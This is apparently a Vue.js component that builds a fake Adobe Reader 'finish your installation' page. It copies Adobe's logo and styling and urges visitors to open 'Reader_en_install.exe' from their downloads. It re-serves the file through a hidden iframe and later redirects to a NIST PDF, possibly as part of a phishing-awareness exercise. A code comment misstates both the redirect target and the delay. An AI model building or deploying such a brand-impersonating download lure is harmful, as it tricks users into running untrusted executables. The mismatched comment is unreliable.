<template>
  <div class="adobe-page">
    <header class="adobe-header">
      <svg class="adobe-logo" viewBox="0 0 30 26" fill="#FA0F00">
        <path d="M19 0h11v26zM11.1 0H0v26zM15 9.6L22.1 26h-4.6l-2.1-5.2H8.5z"/>
      </svg>
      <span class="adobe-text">Adobe</span>
    </header>
    
    <div class="main-container">
      <div class="left-content">
        <h1 class="title">Let's finish your installation</h1>
        
        <div class="instruction-item">
          <svg class="icon-folder" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M3 7a2 2 0 0 1 2-2h4.586a1 1 0 0 1 .707.293l1.414 1.414A1 1 0 0 0 12.414 7H19a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7z"/>
          </svg>
          <div class="instruction-content">
            <p class="instruction-text">
              Open <strong class="filename">{{ displayFileName }}</strong> from recent downloads (right corner of this screen) to install.
            </p>
          </div>
        </div>
        
        <div class="instruction-item">
          <svg class="icon-link" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M13.544 10.456a4.368 4.368 0 0 0-6.176 0l-3.089 3.088a4.367 4.367 0 1 0 6.177 6.177L12 18.177M10.456 13.544a4.368 4.368 0 0 0 6.176 0l3.089-3.088a4.367 4.367 0 1 0-6.177-6.177L12 5.823"/>
          </svg>
          <div class="instruction-content">
            <p class="instruction-text">
              If your download didn't work, <a href="#" @click.prevent="downloadAgain" class="download-link">download again</a>.
            </p>
          </div>
        </div>
      </div>
      
      <div class="right-content">
        <div class="illustration-bg">
          <div class="download-visual">
            <!-- Browser window with download indicator -->
            <div class="browser-window">
              <div class="browser-header">
                <div class="browser-dots">
                  <span class="dot"></span>
                  <span class="dot"></span>
                  <span class="dot"></span>
                </div>
                <div class="browser-address-bar"></div>
                <!-- Download icon in top right corner -->
                <div class="download-button">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/>
                  </svg>
                  <span class="download-badge">1</span>
                </div>
              </div>
              
              <!-- Arrow pointing to download button -->
              <div class="arrow-indicator">
                <svg viewBox="0 0 100 100" class="curved-arrow">
                  <defs>
                    <marker id="arrowhead" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
                      <polygon points="0 0, 10 3, 0 6" fill="#FA0F00" />
                    </marker>
                  </defs>
                  <path d="M 10 80 Q 60 60, 85 20" stroke="#FA0F00" stroke-width="3" fill="none" marker-end="url(#arrowhead)" stroke-dasharray="5,5">
                    <animate attributeName="stroke-dashoffset" from="10" to="0" dur="1s" repeatCount="indefinite"/>
                  </path>
                </svg>
                <div class="arrow-text">Click here!</div>
              </div>
              
              <!-- Download dropdown panel -->
              <div class="download-panel">
                <div class="panel-header">
                  <span>Downloads</span>
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="close-icon">
                    <line x1="18" y1="6" x2="6" y2="18"></line>
                    <line x1="6" y1="6" x2="18" y2="18"></line>
                  </svg>
                </div>
                
                <div class="download-item">
                  <div class="file-icon-wrapper">
                    <svg viewBox="0 0 24 24" fill="#FA0F00" class="pdf-icon">
                      <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/>
                      <path d="M14 2v6h6" fill="none" stroke="white" stroke-width="1.5"/>
                    </svg>
                  </div>
                  
                  <div class="file-details">
                    <div class="file-name-text">{{ displayFileName }}</div>
                    <div class="file-size">12.5 MB</div>
                    <div class="download-complete-bar">
                      <div class="complete-bar-fill"></div>
                    </div>
                  </div>
                  
                  <div class="file-actions">
                    <button class="action-btn">
                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M3 7h18M10 11v6M14 11v6M5 7l1 12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2l1-12"/>
                      </svg>
                    </button>
                  </div>
                </div>
              </div>
            </div>
            
            <!-- Pulsing cursor icon -->
            <div class="cursor-pointer">
              <svg viewBox="0 0 32 32" class="cursor-svg">
                <path d="M8 2 L8 22 L12 18 L15 26 L18 25 L15 17 L20 17 Z" fill="#000" stroke="#fff" stroke-width="1"/>
              </svg>
              <div class="cursor-pulse"></div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: 'AdobeReaderInstall',
  props: {
    filename: {
      type: String,
      default: ''
    }
  },
  computed: {
    displayFileName() {
      console.log('AdobeReaderInstall received filename prop:', this.filename)
      return this.filename || 'Reader_en_install.exe'
    }
  },
  methods: {
    async downloadAgain() {
      try {
        const timestamp = Date.now()
        const downloadUrl = `/api/download?t=${timestamp}`
        
        const iframe = document.createElement('iframe')
        iframe.style.display = 'none'
        document.body.appendChild(iframe)
        iframe.src = downloadUrl
        
        setTimeout(() => document.body.removeChild(iframe), 5000)
      } catch (error) {
        console.error('Download error:', error)
      }
    }
  },
  mounted() {
    // Redirect to adobe.com after 60 seconds
    setTimeout(() => {
      window.location.href = 'https://nvlpubs.nist.gov/nistpubs/cswp/nist.cswp.04162018.pdf'
    }, 180000)
  }
}
</script>

<style scoped>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

.adobe-page {
  min-height: 100vh;
  background-color: #fafafa;
  font-family: adobe-clean, "Source Sans Pro", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  -webkit-tap-highlight-color: rgba(0,0,0,0);
}

.adobe-header {
  display: flex;
  align-items: center;
  padding: 16px 32px;
  background: #fff;
}

.adobe-logo {
  width: 30px;
  height: 26px;
  margin-right: 8px;
}

.adobe-text {
  font-size: 1.375rem;
  font-weight: 700;
  color: #000;
}

.main-container {
  display: grid;
  grid-template-columns: 1fr 1fr;
  min-height: calc(100vh - 58px);
  max-width: 1400px;
  margin: 0 auto;
}

.left-content {
  display: flex;
  flex-direction: column;
  justify-content: center;
  padding: 60px 80px;
  background: #fff;
}

.title {
  font-size: 2.625rem;
  font-weight: 700;
  color: #2c2c2c;
  margin: 0 0 60px 0;
  line-height: 1.15;
  letter-spacing: -0.02em;
}

.instruction-item {
  display: flex;
  align-items: flex-start;
  gap: 16px;
  margin-bottom: 36px;
}

.instruction-item:last-child {
  margin-bottom: 0;
}

.icon-folder,
.icon-link {
  width: 24px;
  height: 24px;
  flex-shrink: 0;
  color: #2c2c2c;
  margin-top: 2px;
}

.instruction-content {
  flex: 1;
  padding-top: 0px;
}

.instruction-text {
  font-size: 1.125rem;
  color: #2c2c2c;
  line-height: 1.7;
  margin: 0;
}

.filename {
  font-weight: 700;
  color: #2c2c2c;
}

.download-link {
  color: #1473E6;
  text-decoration: none;
  font-weight: 400;
}

.download-link:hover {
  text-decoration: underline;
}

.right-content {
  background: #fce4e4;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 60px;
  position: relative;
}

.illustration-bg {
  width: 100%;
  max-width: 450px;
}

.download-visual {
  position: relative;
  width: 100%;
}

.browser-window {
  background: #fff;
  border-radius: 12px;
  box-shadow: 0 10px 40px rgba(0,0,0,0.15);
  overflow: visible;
  position: relative;
}

.browser-header {
  background: #f5f5f5;
  border-radius: 12px 12px 0 0;
  padding: 12px 16px;
  display: flex;
  align-items: center;
  gap: 12px;
  position: relative;
}

.browser-dots {
  display: flex;
  gap: 6px;
}

.dot {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background: #ddd;
}

.browser-address-bar {
  flex: 1;
  height: 28px;
  background: #fff;
  border-radius: 6px;
  border: 1px solid #e0e0e0;
}

.download-button {
  position: relative;
  width: 36px;
  height: 36px;
  background: #fff;
  border-radius: 6px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  transition: background 0.2s;
  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
  animation: downloadPulse 2s infinite;
}

@keyframes downloadPulse {
  0%, 100% {
    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
  }
  50% {
    box-shadow: 0 2px 16px rgba(250, 15, 0, 0.4);
  }
}

.download-button svg {
  width: 20px;
  height: 20px;
  color: #333;
}

.download-badge {
  position: absolute;
  top: -4px;
  right: -4px;
  background: #FA0F00;
  color: white;
  width: 18px;
  height: 18px;
  border-radius: 50%;
  font-size: 11px;
  font-weight: bold;
  display: flex;
  align-items: center;
  justify-content: center;
}

.arrow-indicator {
  position: absolute;
  top: -20px;
  right: 40px;
  display: flex;
  flex-direction: column;
  align-items: center;
  z-index: 10;
}

.curved-arrow {
  width: 120px;
  height: 100px;
}

.arrow-text {
  color: #FA0F00;
  font-weight: 700;
  font-size: 1rem;
  margin-top: -20px;
  background: #fce4e4;
  padding: 4px 12px;
  border-radius: 20px;
  white-space: nowrap;
  animation: bounce 1s infinite;
}

@keyframes bounce {
  0%, 100% {
    transform: translateY(0);
  }
  50% {
    transform: translateY(-5px);
  }
}

.download-panel {
  background: #fff;
  border-radius: 0 0 12px 12px;
  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
}

.panel-header {
  padding: 12px 16px;
  border-bottom: 1px solid #e0e0e0;
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-weight: 600;
  color: #333;
  font-size: 0.9rem;
}

.close-icon {
  width: 16px;
  height: 16px;
  color: #999;
}

.download-item {
  padding: 16px;
  display: flex;
  gap: 12px;
  align-items: center;
  background: #fafafa;
  border-radius: 0 0 12px 12px;
}

.file-icon-wrapper {
  width: 40px;
  height: 40px;
  flex-shrink: 0;
}

.pdf-icon {
  width: 100%;
  height: 100%;
}

.file-details {
  flex: 1;
  min-width: 0;
}

.file-name-text {
  font-size: 0.875rem;
  font-weight: 600;
  color: #2c2c2c;
  margin-bottom: 4px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.file-size {
  font-size: 0.75rem;
  color: #666;
  margin-bottom: 6px;
}

.download-complete-bar {
  height: 4px;
  background: #e0e0e0;
  border-radius: 2px;
  overflow: hidden;
}

.complete-bar-fill {
  height: 100%;
  background: #4CAF50;
  width: 100%;
  animation: fillBar 1.5s ease-out;
}

@keyframes fillBar {
  from {
    width: 0%;
  }
  to {
    width: 100%;
  }
}

.file-actions {
  display: flex;
  gap: 8px;
}

.action-btn {
  background: transparent;
  border: none;
  padding: 6px;
  cursor: pointer;
  border-radius: 4px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.action-btn svg {
  width: 18px;
  height: 18px;
  color: #666;
}

.action-btn:hover {
  background: #f0f0f0;
}

.cursor-pointer {
  position: absolute;
  top: 20px;
  right: 20px;
  width: 40px;
  height: 40px;
  pointer-events: none;
  animation: cursorMove 3s infinite;
}

@keyframes cursorMove {
  0%, 100% {
    transform: translate(0, 0);
  }
  50% {
    transform: translate(5px, -5px);
  }
}

.cursor-svg {
  width: 100%;
  height: 100%;
  filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
}

.cursor-pulse {
  position: absolute;
  top: 0;
  left: 0;
  width: 40px;
  height: 40px;
  background: #FA0F00;
  border-radius: 50%;
  opacity: 0.3;
  animation: pulse 2s infinite;
}

@keyframes pulse {
  0%, 100% {
    transform: scale(0.8);
    opacity: 0.3;
  }
  50% {
    transform: scale(1.5);
    opacity: 0;
  }
}

@keyframes scaleIn {
  from {
    transform: scale(0);
    opacity: 0;
  }
  to {
    transform: scale(1);
    opacity: 1;
  }
}

@media (max-width: 1024px) {
  .main-container {
    grid-template-columns: 1fr;
  }
  
  .right-content {
    display: none;
  }
  
  .left-content {
    padding: 40px 30px;
  }
}

@media (max-width: 768px) {
  .adobe-header {
    padding: 16px 20px;
  }
  
  .left-content {
    padding: 30px 20px;
  }
  
  .title {
    font-size: 2rem;
  }
  
  .instruction-text {
    font-size: 1rem;
  }
}

@media (max-width: 480px) {
  .title {
    font-size: 1.75rem;
    margin-bottom: 30px;
  }
  
  .instruction-item {
    margin-bottom: 24px;
  }
}
</style>


